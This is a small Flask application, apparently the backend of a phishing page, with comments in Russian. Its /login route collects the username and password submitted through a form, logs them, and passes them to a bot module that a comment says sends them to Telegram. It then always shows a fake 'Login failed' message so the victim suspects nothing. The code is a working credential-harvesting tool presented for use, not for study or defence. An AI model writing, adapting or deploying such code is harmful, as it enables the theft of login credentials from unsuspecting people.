from flask import Flask, request, render_template
import asyncio
from bot import add_login  # импортируем из нового bot.py

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f"🔐 Новый логин: {username} / {password}")

    # Отправка в телеграм
    asyncio.run(add_login(username, password))

    return "<h3>Login failed. Please try again.</h3>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
